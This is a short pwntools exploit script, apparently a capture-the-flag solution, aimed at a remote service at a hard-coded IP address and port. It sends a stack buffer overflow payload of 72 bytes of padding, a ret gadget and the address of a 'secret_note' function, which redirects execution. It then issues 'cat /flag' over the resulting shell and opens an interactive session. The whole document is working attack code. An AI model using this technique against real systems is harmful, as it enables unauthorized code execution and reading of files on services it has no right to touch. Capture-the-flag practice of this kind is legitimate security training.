from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "120.27.146.76"
PORT = 19574

ret = 0x40101a
secret_note = 0x401196
payload = b"A" * 72 + p64(ret) + p64(secret_note)

io = remote(HOST, PORT)
io.recvuntil(b"Leave your note:\n")
io.sendline(payload)

sleep(0.2)
io.sendline(b"cat /flag")

io.interactive()